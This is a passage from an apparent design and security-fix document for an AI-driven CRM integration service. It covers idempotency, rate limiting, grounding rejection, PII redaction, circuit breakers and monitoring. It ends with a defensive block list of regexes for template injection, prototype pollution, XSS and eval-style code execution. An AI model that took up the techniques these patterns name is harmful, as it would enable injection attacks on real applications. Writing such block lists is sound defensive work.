          "secretsmanager:DescribeSecret"
        ]
        Resource = [
          aws_secretsmanager_secret.salesforce.arn,
          aws_secretsmanager_secret.hubspot.arn
        ]
      }
    ]
  })
}
```

---

#### 3. Idempotency Key Implementation

**Problem**: Idempotency key generation not defined, collision risk.

**Solution** with TTL and replay protection:

```typescript
// src/mcp/utils/idempotency.ts

import { createHash } from 'crypto';
import { Injectable, Inject } from '@nestjs/common';
import { Redis } from 'ioredis';

export interface IdempotencyConfig {
  // TTL for idempotency records (default: 48 hours)
  ttlHours: number;
  // Namespace for Redis keys
  namespace: string;
}

@Injectable()
export class IdempotencyService {
  private readonly DEFAULT_TTL_HOURS = 48;

  constructor(
    @Inject('REDIS_CLIENT') private readonly redis: Redis,
    private config: IdempotencyConfig,
  ) {}

  /**
   * Generate deterministic idempotency key
   * Includes timestamp component to prevent indefinite replays
   */
  generateKey(
    email: string,
    campaignId: string | undefined,
    action: string,
    windowMinutes: number = 60
  ): string {
    // Round timestamp to window bucket for predictable keys during retries
    const windowMs = windowMinutes * 60 * 1000;
    const timeBucket = Math.floor(Date.now() / windowMs) * windowMs;
    
    const data = [
      email.toLowerCase().trim(),
      campaignId?.toLowerCase().trim() || 'none',
      action.toLowerCase(),
      timeBucket.toString(),
    ].join('::');

    return createHash('sha256').update(data).digest('hex');
  }

  /**
   * Check if action was already processed
   */
  async isProcessed(key: string): Promise<{ processed: boolean; result?: any }> {
    const stored = await this.redis.get(`${this.config.namespace}:${key}`);
    
    if (stored) {
      return { processed: true, result: JSON.parse(stored) };
    }
    
    return { processed: false };
  }

  /**
   * Store result for idempotency with TTL
   */
  async storeResult(key: string, result: any): Promise<void> {
    const ttlSeconds = (this.config.ttlHours || this.DEFAULT_TTL_HOURS) * 3600;
    
    await this.redis.setex(
      `${this.config.namespace}:${key}`,
      ttlSeconds,
      JSON.stringify({
        result,
        timestamp: Date.now(),
      })
    );
  }

  /**
   * Clear idempotency record (for testing/rollback)
   */
  async clear(key: string): Promise<void> {
    await this.redis.del(`${this.config.namespace}:${key}`);
  }
}
```

**Usage in CreateLeadTool**:

```typescript
// src/mcp/tools/lead-lifecycle.tools.ts

async execute(context: MCPContext, params: CreateLeadParams): Promise<MCPResult<LeadResult>> {
  // Generate idempotency key for this action
  const idempotencyKey = this.idempotencyService.generateKey(
    params.email,
    params.campaignId,
    'create_lead',
    60  // 60-minute window for retries
  );

  // Check if already processed
  const { processed, result } = await this.idempotencyService.isProcessed(idempotencyKey);
  
  if (processed) {
    this.logger.log(`Idempotency hit for ${params.email}, returning cached result`);
    return {
      success: true,
      data: result,
      crmRecordId: result.crmRecordId,
      warnings: ['Duplicate request - returning cached result'],
    };
  }

  // Execute lead creation
  const executionResult = await this.crmExecutor.createLead({
    ...params,
    idempotencyKey,  // Pass to CRM for its own deduplication
  });

  // Store result for future idempotency checks
  if (executionResult.success) {
    await this.idempotencyService.storeResult(idempotencyKey, executionResult.data);
  }

  return executionResult;
}
```

---

### ⚠️ Medium-Risk Issues - FIXED

#### 4. Multi-Layer Rate Limiting

**Clarification**: Rate limiting should occur at **multiple layers**, not just CRM:

```
┌─────────────────────────────────────────────────────────────────┐
│                    RATE LIMITING LAYERS                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Layer 1: API Gateway (Ingress)                                  │
│  ├── Global request rate per IP                                  │
│  ├── Burst protection for webhook endpoints                      │
│  └── DDoS prevention                                             │
│                                                                  │
│  Layer 2: Application (MCP Service)  ← IMPLEMENTED BELOW        │
│  ├── Per-lead action rate (prevent spam)                        │
│  ├── Per-account CRM API quota respect                          │
│  └── Global MCP service protection                              │
│                                                                  │
│  Layer 3: CRM Provider (Salesforce/HubSpot)                      │
│  ├── Salesforce API daily limits (e.g., 100k calls/day)         │
│  ├── HubSpot rate limits (100 requests/10 seconds)              │
│  └── Concurrent request limits                                   │
│                                                                  │
│  Layer 4: AI Provider (Gemini/Bedrock)                          │
│  ├── Token-per-minute limits                                    │
│  └── Request-per-minute limits                                  │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

**This implementation focuses on Layer 2 (Application/MCP level)**. CRM-level limits (Layer 3) are handled by:
- Salesforce's native API limits (the jsforce client respects these)
- HubSpot's rate limit headers (exponential backoff on 429 responses)

**Problem**: Rate limiting mentioned but not implemented at the MCP application layer.

**Solution** - Tiered MCP rate limiter:

```typescript
// src/mcp/guards/mcp-rate-limiter.ts

export interface RateLimitConfig {
  // Per-lead: prevent spam on single lead
  perLead: { limit: number; windowSeconds: number };
  // Per-account: prevent abuse per Salesforce account
  perAccount: { limit: number; windowSeconds: number };
  // Global: service protection
  global: { limit: number; windowSeconds: number };
}

export interface RateLimitResult {
  allowed: boolean;
  limit: number;
  remaining: number;
  resetAt: Date;
  window: string;
}

@Injectable()
export class MCPRateLimiter {
  private readonly DEFAULT_CONFIG: RateLimitConfig = {
    perLead: { limit: 10, windowSeconds: 60 },      // 10 actions/minute per lead
    perAccount: { limit: 100, windowSeconds: 60 },   // 100 actions/minute per account
    global: { limit: 1000, windowSeconds: 60 },      // 1000 actions/minute global
  };

  constructor(
    @Inject('REDIS_CLIENT') private readonly redis: Redis,
    @Optional() private config: RateLimitConfig,
  ) {
    this.config = { ...this.DEFAULT_CONFIG, ...config };
  }

  async checkLimits(
    leadId: number,
    accountId?: string
  ): Promise<{ allowed: boolean; violations: string[]; details: Record<string, RateLimitResult> }> {
    const violations: string[] = [];
    const details: Record<string, RateLimitResult> = {};

    // Check all three tiers
    const checks = await Promise.all([
      this.checkLimit(`mcp:lead:${leadId}`, this.config.perLead),
      this.checkLimit('mcp:global', this.config.global),
      accountId ? this.checkLimit(`mcp:account:${accountId}`, this.config.perAccount) : null,
    ]);

    details.perLead = checks[0];
    details.global = checks[1];
    if (checks[2]) details.perAccount = checks[2];

    if (!checks[0].allowed) violations.push('Per-lead rate limit exceeded');
    if (!checks[1].allowed) violations.push('Global rate limit exceeded');
    if (checks[2] && !checks[2].allowed) violations.push('Per-account rate limit exceeded');

    return {
      allowed: violations.length === 0,
      violations,
      details,
    };
  }

  /**
   * Check CRM-specific rate limits (Layer 3)
   * This respects Salesforce/HubSpot API quotas
   */
  async checkCrmLimits(provider: 'salesforce' | 'hubspot'): Promise<RateLimitResult> {
    const key = `mcp:crm:${provider}:api_calls`;
    
    // Salesforce: Daily API call limit (varies by edition)
    if (provider === 'salesforce') {
      return this.checkLimit(key, { limit: 100000, windowSeconds: 86400 }); // 100k/day
    }
    
    // HubSpot: 100 requests per 10 seconds
    if (provider === 'hubspot') {
      return this.checkLimit(key, { limit: 100, windowSeconds: 10 });
    }
    
    return { allowed: true, limit: 0, remaining: 0, resetAt: new Date(), window: 'N/A' };
  }

  private async checkLimit(
    key: string,
    config: { limit: number; windowSeconds: number }
  ): Promise<RateLimitResult> {
    const multi = this.redis.multi();
    const now = Math.floor(Date.now() / 1000);
    const windowKey = `${key}:${Math.floor(now / config.windowSeconds)}`;

    multi.incr(windowKey);
    multi.expire(windowKey, config.windowSeconds);

    const results = await multi.exec();
    const current = (results?.[0]?.[1] as number) || 0;
    const resetAt = new Date((Math.floor(now / config.windowSeconds) + 1) * config.windowSeconds * 1000);

    return {
      allowed: current <= config.limit,
      limit: config.limit,
      remaining: Math.max(0, config.limit - current),
      resetAt,
      window: `${config.windowSeconds}s`,
    };
  }

  /**
   * Add rate limit headers for monitoring
   */
  getRateLimitHeaders(result: RateLimitResult): Record<string, string> {
    return {
      'X-RateLimit-Limit': result.limit.toString(),
      'X-RateLimit-Remaining': result.remaining.toString(),
      'X-RateLimit-Reset': Math.floor(result.resetAt.getTime() / 1000).toString(),
    };
  }
}
```

**Integration in MCPService**:

```typescript
// src/mcp/mcp.service.ts

async processAfterGrounding(
  lead: Lead,
  aiResult: AiAnalysisResult,
  enrichmentData: any,
): Promise<MCPProcessResult> {
  // ... context setup ...

  // Layer 2: Application-level rate limit check
  const rateLimitCheck = await this.rateLimiter.checkLimits(lead.id);
  if (!rateLimitCheck.allowed) {
    await this.audit.logBlocked(context, rateLimitCheck.violations);
    return {
      status: 'RATE_LIMITED',
      violations: rateLimitCheck.violations,
      retryAfter: Math.min(...Object.values(rateLimitCheck.details).map(d => d.resetAt.getTime())),
    };
  }

  // ... continue with action plan execution ...
}
```

---

#### 4b. CRM-Level Rate Limiting (Layer 3)

The CRM executors must also handle their own API-specific rate limits:

**Salesforce Rate Limit Handling**:

```typescript
// src/mcp/executors/salesforce.executor.ts

@Injectable()
export class SalesforceMCPExecutor implements MCPExecutor {
  private dailyApiUsage = 0;
  private readonly DAILY_LIMIT = 100000;  // Enterprise edition

  constructor(
    private configService: ConfigService,
    private rateLimiter: MCPRateLimiter,  // Inject rate limiter
  ) {}

  private async checkSalesforceLimits(): Promise<void> {
    // Check if we're approaching Salesforce limits
    const crmLimit = await this.rateLimiter.checkCrmLimits('salesforce');
    
    if (!crmLimit.allowed) {
      throw new Error('Salesforce API daily limit approaching');
    }

    // Also check real-time limit via Salesforce API
    const limits = await this.conn.limits();
    this.dailyApiUsage = limits.dailyApiRequests?.used || 0;
    
    if (this.dailyApiUsage > this.DAILY_LIMIT * 0.9) {
      this.logger.error(`Salesforce API at ${this.dailyApiUsage}/${this.DAILY_LIMIT} calls`);
      throw new Error('Salesforce API limit critical');
    }
  }

  async createLead(params: CreateLeadParams): Promise<CRMResult> {
    // Check CRM limits before each call
    await this.checkSalesforceLimits();

    try {
      const result = await this.conn.sobject('Lead').create({
        Email: params.email,
        // ...
      });
      
      this.dailyApiUsage++;
      return { success: result.success, crmRecordId: result.id };
      
    } catch (error) {
      // Handle Salesforce-specific rate limiting (429 errors)
      if (error.errorCode === 'REQUEST_LIMIT_EXCEEDED') {
        return {
          success: false,
          error: 'Salesforce rate limit exceeded',
          retryAfter: 60000,  // Retry after 1 minute
        };
      }
      throw error;
    }
  }
}
```

**HubSpot Rate Limit Handling**:

```typescript
// src/mcp/executors/hubspot.executor.ts

@Injectable()
export class HubSpotMCPExecutor implements MCPExecutor {
  constructor(
    private client: hubspot.Client,
    private rateLimiter: MCPRateLimiter,
  ) {}

  async createLead(params: CreateLeadParams): Promise<CRMResult> {
    // Check HubSpot rate limits before call
    const crmLimit = await this.rateLimiter.checkCrmLimits('hubspot');
    
    if (!crmLimit.allowed) {
      return {
        success: false,
        error: 'HubSpot rate limit approaching',
        retryAfter: 10000,  // 10 second window
      };
    }

    try {
      const contact = await this.client.crm.contacts.basicApi.create({
        properties: { /* ... */ },
      });
      
      return { success: true, crmRecordId: contact.id };
      
    } catch (error) {
      // HubSpot returns 429 with Retry-After header
      if (error.code === 429) {
        const retryAfter = error.response?.headers?.['retry-after'] || 10;
        return {
          success: false,
          error: 'HubSpot rate limit exceeded',
          retryAfter: retryAfter * 1000,
        };
      }
      throw error;
    }
  }
}
```

**Mock Executor (No Rate Limits)**:

```typescript
// src/mcp/executors/mock.executor.ts

async createLead(params: CreateLeadParams): Promise<CRMResult> {
  // Mock doesn't have real rate limits, but we simulate them
  await this.delay(100);  // Simulate API latency
  
  // Log would-be rate limit usage
  this.logger.debug(`[MOCK] API call: createLead (no rate limit in local dev)`);
  
  return {
    success: true,
    crmRecordId: `00Q${Date.now()}`,
    mock: true,
  };
}
```

---

**Rate Limit Summary by Layer**:

| Layer | What It Protects | Who Manages | Enforcement |
|-------|------------------|-------------|-------------|
| 1. API Gateway | Ingress, DDoS | Infrastructure (AWS ALB/CloudFront) | IP-based blocking |
| 2. Application | MCP service, per-lead spam | `MCPRateLimiter` (Redis) | Redis counters |
| 3. CRM API | Salesforce/HubSpot quotas | CRM executors + CRM native | API headers, daily limits |
| 4. AI Provider | Gemini/Bedrock quotas | AI service (existing) | Token limits |

---

#### 5. Explicit Grounding Rejection Handling

**Problem**: REJECTED status might not halt processing.

**Solution** - Hard stop on grounding failure:

```typescript
// src/mcp/mcp.service.ts

async processAfterGrounding(...): Promise<MCPProcessResult> {
  const executionId = uuid();
  
  // HARD REJECTION: Check grounding status before ANY action
  if (aiResult.grounding_status === GroundingStatus.REJECTED) {
    this.logger.error(`Grounding REJECTED for lead ${lead.id}: ${aiResult.grounding_errors?.join(', ')}`);
    
    await this.audit.logRejection({
      leadId: lead.id,
      executionId,
      groundingErrors: aiResult.grounding_errors || [],
      aiResult,
      timestamp: new Date(),
    });

    // Update lead status to blocked
    await this.leadRepository.update(lead.id, {
      status: 'AI_REJECTED',
      grounding_errors: aiResult.grounding_errors,
    });

    return {
      status: 'REJECTED_BY_GROUNDING',
      executionId,
      halt: true,
      errors: aiResult.grounding_errors,
      // NO CRM ACTIONS ARE EXECUTED
    };
  }

  // DOWNGRADED handling: Log but allow processing
  if (aiResult.grounding_status === GroundingStatus.DOWNGRADED) {
    this.logger.warn(`Grounding DOWNGRADED for lead ${lead.id}`);
    await this.audit.logDowngrade({
      leadId: lead.id,
      executionId,
      originalIntent: aiResult.intent,
      errors: aiResult.grounding_errors,
    });
    // Continue with downgraded result...
  }

  // Only VALID or DOWNGRADED results proceed to action execution
  // ... rest of processing ...
}
```

---

#### 6. PII Redaction in Audit Logs

**Problem**: Raw PII stored in audit logs.

**Solution** - Configurable redaction:

```typescript
// src/mcp/utils/pii-redactor.ts

export interface RedactionConfig {
  // Fields to redact
  sensitiveFields: string[];
  // Redaction strategy
  strategy: 'mask' | 'hash' | 'truncate';
  // For truncate: show last N chars
  truncateShowLast?: number;
}

@Injectable()
export class PIIRedactor {
  private readonly DEFAULT_CONFIG: RedactionConfig = {
    sensitiveFields: [
      'email',
      'firstName',
      'lastName',
      'phone',
      'mobile',
      'address',
      'city',
      'state',
      'postalCode',
      'ssn',
      'taxId',
    ],
    strategy: 'truncate',
    truncateShowLast: 4,
  };

  constructor(@Optional() private config: RedactionConfig) {
    this.config = { ...this.DEFAULT_CONFIG, ...config };
  }

  /**
   * Deep redact an object
   */
  redact<T extends Record<string, any>>(obj: T): Record<string, any> {
    return this.redactValue(obj) as Record<string, any>;
  }

  private redactValue(value: any): any {
    if (value === null || value === undefined) {
      return value;
    }

    if (typeof value === 'string') {
      return this.redactString(value);
    }

    if (Array.isArray(value)) {
      return value.map(item => this.redactValue(item));
    }

    if (typeof value === 'object') {
      return Object.entries(value).reduce((acc, [key, val]) => {
        if (this.isSensitiveField(key)) {
          acc[key] = this.applyRedaction(val);
        } else {
          acc[key] = this.redactValue(val);
        }
        return acc;
      }, {} as Record<string, any>);
    }

    return value;
  }

  private isSensitiveField(key: string): boolean {
    const normalized = key.toLowerCase().replace(/[_-]/g, '');
    return this.config.sensitiveFields.some(field => 
      normalized.includes(field.toLowerCase())
    );
  }

  private applyRedaction(value: any): string {
    if (typeof value !== 'string') {
      return '[REDACTED]';
    }

    switch (this.config.strategy) {
      case 'mask':
        return '*'.repeat(value.length);
      
      case 'hash':
        return createHash('sha256').update(value).digest('hex').substring(0, 16);
      
      case 'truncate':
        const showLast = this.config.truncateShowLast || 4;
        if (value.length <= showLast) {
          return '*'.repeat(value.length);
        }
        return `***${value.slice(-showLast)}`;
      
      default:
        return '[REDACTED]';
    }
  }

  private redactString(value: string): string {
    // Check if string contains email pattern
    if (this.containsEmail(value)) {
      return this.redactEmail(value);
    }
    return value;
  }

  private containsEmail(value: string): boolean {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value);
  }

  private redactEmail(email: string): string {
    const [local, domain] = email.split('@');
    return `${local.charAt(0)}***@${domain}`;
  }
}
```

**Usage in executors**:

```typescript
// src/mcp/executors/mock.executor.ts

async logAction(action: string, params: any, result: any): Promise<void> {
  // Redact before storing
  const redactedParams = this.piiRedactor.redact(params);
  const redactedResult = this.piiRedactor.redact(result);

  await this.syncLogRepository.save({
    action,
    params: JSON.stringify(redactedParams),
    result: JSON.stringify(redactedResult),
    timestamp: new Date(),
    hasPii: true,  // Flag for GDPR compliance
  });
}
```

**Example redaction output**:

| Original | Redacted |
|----------|----------|
| `john.doe@acme.com` | `j***@acme.com` |
| `+1-555-123-4567` | `***4567` |
| `123 Main St, Boston, MA` | `***ton, MA` |
| `Alex Smith` | `***mith` |

---

#### 7. Circuit Breaker for CRM APIs

**Problem**: No circuit breaker for external API failures.

**Solution** - Opossum integration:

```typescript
// src/mcp/utils/circuit-breaker.factory.ts

import CircuitBreaker from 'opossum';

export interface CircuitBreakerConfig {
  timeout: number;           // Time in ms to wait before failing
  errorThreshold: number;    // Percentage of failures to open circuit
  resetTimeout: number;      // Time before attempting to close circuit
  volumeThreshold: number;   // Min requests before calculating failure %
}

@Injectable()
export class CircuitBreakerFactory {
  private breakers: Map<string, CircuitBreaker> = new Map();

  constructor(private configService: ConfigService) {}

  createBreaker(
    name: string,
    asyncFunction: (...args: any[]) => Promise<any>,
    config?: Partial<CircuitBreakerConfig>
  ): CircuitBreaker {
    if (this.breakers.has(name)) {
      return this.breakers.get(name)!;
    }

    const options: CircuitBreaker.Options = {
      timeout: config?.timeout || 10000,
      errorThresholdPercentage: config?.errorThreshold || 50,
      resetTimeout: config?.resetTimeout || 30000,
      volumeThreshold: config?.volumeThreshold || 10,
      
      // Custom error filter - don't count 4xx errors as failures
      errorFilter: (error) => {
        const statusCode = error?.statusCode || error?.response?.status;
        return statusCode >= 400 && statusCode < 500;
      },
    };

    const breaker = new CircuitBreaker(asyncFunction, options);

    // Event logging for monitoring
    breaker.on('open', () => {
      this.logger.error(`Circuit breaker OPEN for ${name}`);
    });

    breaker.on('halfOpen', () => {
      this.logger.warn(`Circuit breaker HALF-OPEN for ${name}`);
    });

    breaker.on('close', () => {
      this.logger.log(`Circuit breaker CLOSED for ${name}`);
    });

    this.breakers.set(name, breaker);
    return breaker;
  }

  getBreaker(name: string): CircuitBreaker | undefined {
    return this.breakers.get(name);
  }

  health(): Record<string, { state: string; stats: any }> {
    const health: Record<string, { state: string; stats: any }> = {};
    this.breakers.forEach((breaker, name) => {
      health[name] = {
        state: breaker.opened ? 'OPEN' : breaker.halfOpen ? 'HALF_OPEN' : 'CLOSED',
        stats: breaker.stats,
      };
    });
    return health;
  }
}
```

**Usage in Salesforce executor**:

```typescript
// src/mcp/executors/salesforce.executor.ts

@Injectable()
export class SalesforceMCPExecutor implements MCPExecutor {
  private createLeadBreaker: CircuitBreaker;

  constructor(
    private configService: ConfigService,
    private secretsProvider: SecretsProvider,
    private breakerFactory: CircuitBreakerFactory,
  ) {}

  async onModuleInit() {
    await this.connect();

    // Create circuit breakers for each critical operation
    this.createLeadBreaker = this.breakerFactory.createBreaker(
      'salesforce:createLead',
      this.executeCreateLead.bind(this),
      {
        timeout: 15000,
        errorThreshold: 50,
        resetTimeout: 60000,  // 1 minute before retry
      }
    );

    // ... other breakers ...
  }

  async createLead(params: CreateLeadParams): Promise<CRMResult> {
    // Execute through circuit breaker
    return this.createLeadBreaker.fire(params);
  }

  private async executeCreateLead(params: CreateLeadParams): Promise<CRMResult> {
    // Actual implementation
    const result = await this.conn.sobject('Lead').create({
      Email: params.email,
      // ...
    });
    return { success: result.success, crmRecordId: result.id };
  }

  // Health check endpoint
  health(): { connected: boolean; circuits: any } {
    return {
      connected: this.conn?.accessToken ? true : false,
      circuits: this.breakerFactory.health(),
    };
  }
}
```

---

#### Prometheus Metrics for Circuit Breaker States

Add Prometheus metrics to track circuit breaker health in real-time:

```typescript
// src/mcp/metrics/circuit-breaker.metrics.ts

import { Injectable } from '@nestjs/common';
import { Counter, Gauge, Histogram } from 'prom-client';
import { CircuitBreaker } from 'opossum';

@Injectable()
export class CircuitBreakerMetrics {
  // Current state of each circuit breaker (0=closed, 1=half-open, 2=open)
  private readonly circuitStateGauge: Gauge<string>;
  
  // Total number of requests
  private readonly circuitRequestsTotal: Counter<string>;
  
  // Total number of failed requests
  private readonly circuitFailuresTotal: Counter<string>;
  
  // Total number of successes
  private readonly circuitSuccessesTotal: Counter<string>;
  
  // Total number of rejections (circuit open)
  private readonly circuitRejectionsTotal: Counter<string>;
  
  // Total number of timeouts
  private readonly circuitTimeoutsTotal: Counter<string>;
  
  // Latency histogram for calls through circuit breaker
  private readonly circuitLatencyHistogram: Histogram<string>;

  constructor() {
    this.circuitStateGauge = new Gauge({
      name: 'mcp_circuit_breaker_state',
      help: 'Current state of circuit breaker (0=closed, 1=half-open, 2=open)',
      labelNames: ['breaker_name', 'crm_provider'],
    });

    this.circuitRequestsTotal = new Counter({
      name: 'mcp_circuit_breaker_requests_total',
      help: 'Total requests through circuit breaker',
      labelNames: ['breaker_name', 'crm_provider'],
    });

    this.circuitFailuresTotal = new Counter({
      name: 'mcp_circuit_breaker_failures_total',
      help: 'Total failed requests through circuit breaker',
      labelNames: ['breaker_name', 'crm_provider', 'error_type'],
    });

    this.circuitSuccessesTotal = new Counter({
      name: 'mcp_circuit_breaker_successes_total',
      help: 'Total successful requests through circuit breaker',
      labelNames: ['breaker_name', 'crm_provider'],
    });

    this.circuitRejectionsTotal = new Counter({
      name: 'mcp_circuit_breaker_rejections_total',
      help: 'Total requests rejected due to open circuit',
      labelNames: ['breaker_name', 'crm_provider'],
    });

    this.circuitTimeoutsTotal = new Counter({
      name: 'mcp_circuit_breaker_timeouts_total',
      help: 'Total requests that timed out',
      labelNames: ['breaker_name', 'crm_provider'],
    });

    this.circuitLatencyHistogram = new Histogram({
      name: 'mcp_circuit_breaker_latency_seconds',
      help: 'Latency of requests through circuit breaker',
      labelNames: ['breaker_name', 'crm_provider'],
      buckets: [0.1, 0.5, 1, 2, 5, 10, 30],
    });
  }

  /**
   * Bind metrics to a circuit breaker instance
   */
  bindCircuitBreaker(
    breaker: CircuitBreaker,
    name: string,
    provider: 'salesforce' | 'hubspot' | 'mock'
  ): void {
    // State changes
    breaker.on('open', () => {
      this.circuitStateGauge.set({ breaker_name: name, crm_provider: provider }, 2);
    });

    breaker.on('halfOpen', () => {
      this.circuitStateGauge.set({ breaker_name: name, crm_provider: provider }, 1);
    });

    breaker.on('close', () => {
      this.circuitStateGauge.set({ breaker_name: name, crm_provider: provider }, 0);
    });

    // Request tracking
    breaker.on('fire', () => {
      this.circuitRequestsTotal.inc({ breaker_name: name, crm_provider: provider });
    });

    breaker.on('success', (result) => {
      this.circuitSuccessesTotal.inc({ breaker_name: name, crm_provider: provider });
    });

    breaker.on('failure', (error) => {
      const errorType = this.classifyError(error);
      this.circuitFailuresTotal.inc({
        breaker_name: name,
        crm_provider: provider,
        error_type: errorType,
      });
    });

    breaker.on('reject', () => {
      this.circuitRejectionsTotal.inc({ breaker_name: name, crm_provider: provider });
    });

    breaker.on('timeout', () => {
      this.circuitTimeoutsTotal.inc({ breaker_name: name, crm_provider: provider });
    });

    // Latency tracking
    breaker.on('success', (result, latencyMs) => {
      this.circuitLatencyHistogram.observe(
        { breaker_name: name, crm_provider: provider },
        latencyMs / 1000  // Convert to seconds
      );
    });

    breaker.on('failure', (error, latencyMs) => {
      this.circuitLatencyHistogram.observe(
        { breaker_name: name, crm_provider: provider },
        latencyMs / 1000
      );
    });
  }

  private classifyError(error: any): string {
    if (error?.code === 'ECONNREFUSED') return 'connection_refused';
    if (error?.code === 'ETIMEDOUT') return 'timeout';
    if (error?.code === 'ENOTFOUND') return 'dns_failure';
    if (error?.statusCode === 401) return 'unauthorized';
    if (error?.statusCode === 403) return 'forbidden';
    if (error?.statusCode === 429) return 'rate_limited';
    if (error?.statusCode >= 500) return 'server_error';
    return 'unknown';
  }
}
```

**Updated CircuitBreakerFactory with Metrics**:

```typescript
// src/mcp/utils/circuit-breaker.factory.ts

@Injectable()
export class CircuitBreakerFactory {
  private breakers: Map<string, CircuitBreaker> = new Map();

  constructor(
    private configService: ConfigService,
    private metrics: CircuitBreakerMetrics,  // Inject metrics
  ) {}

  createBreaker(
    name: string,
    asyncFunction: (...args: any[]) => Promise<any>,
    config?: Partial<CircuitBreakerConfig>,
    provider: 'salesforce' | 'hubspot' | 'mock' = 'salesforce'
  ): CircuitBreaker {
    if (this.breakers.has(name)) {
      return this.breakers.get(name)!;
    }

    const options: CircuitBreaker.Options = {
      timeout: config?.timeout || 10000,
      errorThresholdPercentage: config?.errorThreshold || 50,
      resetTimeout: config?.resetTimeout || 30000,
      volumeThreshold: config?.volumeThreshold || 10,
      errorFilter: (error) => {
        const statusCode = error?.statusCode || error?.response?.status;
        return statusCode >= 400 && statusCode < 500;
      },
    };

    const breaker = new CircuitBreaker(asyncFunction, options);

    // Bind Prometheus metrics
    this.metrics.bindCircuitBreaker(breaker, name, provider);

    // Log events for debugging
    breaker.on('open', () => {
      this.logger.error(`Circuit breaker OPEN for ${name}`);
    });

    this.breakers.set(name, breaker);
    return breaker;
  }
  // ... rest of class
}
```

**Grafana Dashboard Queries**:

```promql
# Circuit breaker state (0=closed, 1=half-open, 2=open)
mcp_circuit_breaker_state{crm_provider="salesforce"}

# Error rate over 5 minutes
rate(mcp_circuit_breaker_failures_total[5m]) / rate(mcp_circuit_breaker_requests_total[5m])

# Rejection rate (circuit open events)
rate(mcp_circuit_breaker_rejections_total[5m])

# Average latency by provider
rate(mcp_circuit_breaker_latency_seconds_sum[5m]) / rate(mcp_circuit_breaker_latency_seconds_count[5m])

# Top error types
topk(5, sum by (error_type) (rate(mcp_circuit_breaker_failures_total[1h])))
```

**AlertManager Rules**:

```yaml
# alerts/circuit-breaker-alerts.yml
groups:
  - name: circuit-breaker-alerts
    rules:
      - alert: CircuitBreakerOpen
        expr: mcp_circuit_breaker_state == 2
        for: 1m
        labels:
          severity: critical
        annotations:
          summary: "Circuit breaker {{ $labels.breaker_name }} is OPEN"
          description: "Circuit breaker for {{ $labels.crm_provider }} has been open for more than 1 minute"

      - alert: HighCircuitBreakerErrorRate
        expr: rate(mcp_circuit_breaker_failures_total[5m]) / rate(mcp_circuit_breaker_requests_total[5m]) > 0.1
        for: 2m
        labels:
          severity: warning
        annotations:
          summary: "High error rate for {{ $labels.breaker_name }}"
          description: "Error rate is above 10% for {{ $labels.crm_provider }}"

      - alert: CircuitBreakerRejectionsSpike
        expr: rate(mcp_circuit_breaker_rejections_total[5m]) > 10
        for: 1m
        labels:
          severity: warning
        annotations:
          summary: "Spike in circuit breaker rejections"
          description: "More than 10 rejections per second for {{ $labels.breaker_name }}"
```

---

### Additional Security Enhancements

#### 8. Tool Execution Timeout

```typescript
// src/mcp/interfaces/mcp-tool.interface.ts

export interface MCPTool<TParams = any, TResult = any> {
  name: string;
  description: string;
  category: ToolCategory;
  paramsSchema: z.ZodSchema<TParams>;
  dangerous: boolean;
  timeoutMs?: number;  // Tool-specific timeout
  
  execute(context: MCPContext, params: TParams): Promise<MCPResult<TResult>>;
}

// In tool execution wrapper
async executeWithTimeout<T>(
  tool: MCPTool,
  context: MCPContext,
  params: any
): Promise<MCPResult<T>> {
  const timeout = tool.timeoutMs || this.configService.get('MCP_TOOL_TIMEOUT_MS', 30000);
  
  return Promise.race([
    tool.execute(context, params),
    new Promise<MCPResult<T>>((_, reject) =>
      setTimeout(() => reject(new Error(`Tool ${tool.name} timeout after ${timeout}ms`)), timeout)
    ),
  ]);
}
```

#### 9. Rollback Capability for Multi-Step Actions

```typescript
// src/mcp/interfaces/action-plan.interface.ts

export interface ActionStep {
  toolName: string;
  params: any;
  critical: boolean;
  /**
   * Compensating action for rollback
   */
  compensation?: {
    toolName: string;
    paramsFn: (executionResult: any) => any;
  };
}

export interface ExecutedStep {
  step: ActionStep;
  result: MCPResult;
  executedAt: Date;
}

@Injectable()
export class MCPActionCoordinator {
  async executePlan(
    context: MCPContext,
    plan: ActionStep[]
  ): Promise<{ success: boolean; executed: ExecutedStep[]; rolledBack?: boolean }> {
    const executed: ExecutedStep[] = [];

    for (const step of plan) {
      try {
        const tool = this.registry.getTool(step.toolName);
        const result = await tool.execute(context, step.params);

        executed.push({ step, result, executedAt: new Date() });

        if (!result.success && step.critical) {
          // Rollback all previous steps
          await this.rollback(executed, context);
          return { success: false, executed, rolledBack: true };
        }
      } catch (error) {
        await this.rollback(executed, context);
        throw error;
      }
    }

    return { success: true, executed };
  }

  private async rollback(
    executed: ExecutedStep[],
    context: MCPContext
  ): Promise<void> {
    // Execute compensations in reverse order
    for (let i = executed.length - 1; i >= 0; i--) {
      const { step, result } = executed[i];
      
      if (step.compensation && result.crmRecordId) {
        try {
          const compensationTool = this.registry.getTool(step.compensation.toolName);
          const compensationParams = step.compensation.paramsFn(result);
          
          await compensationTool.execute(context, compensationParams);
          
          this.logger.log(`Compensated ${step.toolName} with ${step.compensation.toolName}`);
        } catch (error) {
          this.logger.error(`Rollback failed for ${step.toolName}: ${error.message}`);
          // Log for manual intervention
          await this.audit.logRollbackFailure(context, step, error);
        }
      }
    }
  }
}
```

#### 10. Enhanced Blocked Patterns

```typescript
// src/mcp/guards/mcp-safety.guard.ts

const BLOCKED_PATTERNS = [
  // Original patterns
  { pattern: /^delete_/i, reason: 'Delete operations are prohibited' },
  { pattern: /^mass_/i, reason: 'Bulk operations require manual approval' },
  { pattern: /schema_change/i, reason: 'Schema modifications not allowed' },
  { pattern: /permission_change/i, reason: 'Permission changes not allowed' },
  { pattern: /execute.*query/i, reason: 'Arbitrary SOQL/SQL execution not allowed' },
  { pattern: /export/i, reason: 'Bulk data export requires approval' },
  
  // Additional security patterns
  { pattern: /\$\{.*\}/, reason: 'Template injection attempt (JavaScript)' },
  { pattern: /__proto__|constructor|prototype/i, reason: 'Prototype pollution attempt' },
  { pattern: /\\x[0-9a-f]{2}/i, reason: 'Hex escape sequence' },
  { pattern: /\\u[0-9a-f]{4}/i, reason: 'Unicode escape sequence' },
  { pattern: /base64\s*\(|atob\s*\(|btoa\s*\(/i, reason: 'Encoding/decoding function' },
  { pattern: /eval\s*\(|Function\s*\(/i, reason: 'Code execution function' },
  { pattern: /<script|javascript:|on\w+=/i, reason: 'XSS attempt' },
